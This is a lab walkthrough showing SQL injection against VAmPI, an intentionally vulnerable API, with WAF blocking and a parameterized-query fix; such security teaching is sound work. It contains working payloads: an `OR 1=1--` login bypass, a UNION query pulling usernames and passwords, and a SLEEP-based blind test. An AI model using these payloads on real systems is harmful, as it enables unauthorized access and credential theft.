# 02 — VAmPI SQL Injection

**Vulnerability class:** [OWASP API8:2023 — Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)
(specifically, unparameterized SQL in request handlers).

VAmPI's login endpoint concatenates the username directly into its SQL
query. A crafted username with SQL metacharacters rewrites the query so
the WHERE clause always evaluates true, bypassing password validation.

## Setup

VAmPI ships with seeded users — no extra registration needed. The
`vulnerable=1` env var in [`base/vampi/deployment.yaml`](../../base/vampi/deployment.yaml)
enables the intentional flaws; `vulnerable=0` patches them.

## Baseline: attack succeeds (WAF off)

### Step 1 — Confirm normal login works

```bash
HOST_IP=$(grep ^LAB_HOST_IP lab.env | cut -d= -f2)
DOMAIN=$(grep ^LAB_DOMAIN   lab.env | cut -d= -f2)

curl -sk -X POST \
  --resolve "vampi.${DOMAIN}:443:${HOST_IP}" \
  "https://vampi.${DOMAIN}/users/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"name1","password":"pass1"}' \
  | python3 -m json.tool
```

Expected: `{"message": "Successfully logged in.", "auth_token": "..."}`.

### Step 2 — Inject SQL to bypass password check

```bash
curl -sk -X POST \
  --resolve "vampi.${DOMAIN}:443:${HOST_IP}" \
  "https://vampi.${DOMAIN}/users/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' OR 1=1--","password":"anything"}' \
  | python3 -m json.tool
```

**Expected (attack succeeds):**

```json
{
  "message": "Successfully logged in.",
  "auth_token": "eyJ0eXAiOiJKV1Q..."
}
```

The payload `admin' OR 1=1--` turns the backend query from:

```sql
SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'
```

into an unconditional match. The `--` comments out the password check.
VAmPI returns a valid JWT for whichever user it finds first — typically
`admin`.

### Step 3 — Confirm the token is admin's

```bash
# Decode the JWT payload (no verification -- just inspection)
TOKEN=$(curl -sk -X POST \
  --resolve "vampi.${DOMAIN}:443:${HOST_IP}" \
  "https://vampi.${DOMAIN}/users/v1/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' OR 1=1--","password":"x"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["auth_token"])')

# Decode with step-cli (installed by scripts/install-ubuntu.sh)
step crypto jwt inspect --insecure <<< "$TOKEN" | python3 -m json.tool
```

Expected payload:

```json
{
  "payload": {
    "sub": "admin",
    "exp": ...
  }
}
```

## Observability

**Grafana panel:** *Total Request Rate* shows a small blip per attempt.
Not a bulk traffic signal — SQLi is low-volume and high-impact.

**Log tail (`task logs:nginx`):**

```
<attacker-ip> - - [..] "POST /users/v1/login HTTP/1.1" 200 89 ...
```

The 200 response with a small body size is the "successful login"
pattern. Without the payload visible in the log, there's nothing to
distinguish this from a legitimate login — which is precisely why
WAFs exist.

## Protected: attack blocked (`task waf-on`)

### On NGINX Plus

```bash
task waf-on
# re-run step 2
```

The [App Protect OWASP policy](../../policies/ap-policy-owasp.yaml)
includes SQL injection signatures. Expected response:

```
HTTP/1.1 403 Forbidden
<html>
<head><title>Request Rejected</title></head>
<body>
The requested URL was rejected.
Your support ID is: <numeric id>
```

`task logs:waf` shows:

```
support_id="<id>" outcome="REJECTED" violations="VIOL_ATTACK_SIGNATURE"
attack_type="SQL-Injection" signature_ids="200000099,200001475"
```

### On OSS (shadow mode)

`task waf-on` applies the overlay but does not enforce. The attack
still succeeds — OSS demonstrates the overlay switching mechanism, not
enforcement.

**To mitigate on OSS:** flip VAmPI's `vulnerable` env var to `0`:

```bash
kubectl set env deploy/vampi -n vampi vulnerable=0
kubectl rollout status deploy/vampi -n vampi
# re-run step 2 -- the response is now HTTP 400 "Invalid username"
```

VAmPI's non-vulnerable mode uses parameterized queries. This is the
application-layer fix every WAF vendor will tell you to also do.

## Real-world correlate

- **TalkTalk 2015:** 157,000 customer records stolen via SQLi in an API.
  Fine: £400,000.
- **Heartland Payment Systems 2008:** 130 million card numbers via SQLi
  in a payment gateway. The signature detection in modern WAFs was a
  direct industry response to incidents like this one.

## Further experiments

- Union-based SQLi to exfiltrate data:
  `username=admin' UNION SELECT username, password FROM users--`
- Blind SQLi with time-based payload:
  `username=admin' OR IF(1=1, SLEEP(5), 0)--`
  Watch the response time in `task logs:nginx` (`rt=` field).
- Compare the [VAmPI SQLi test case in GoTestWAF's output](./README.md)
  to Step 2 — the tooling and the manual approach produce the same
  signatures.
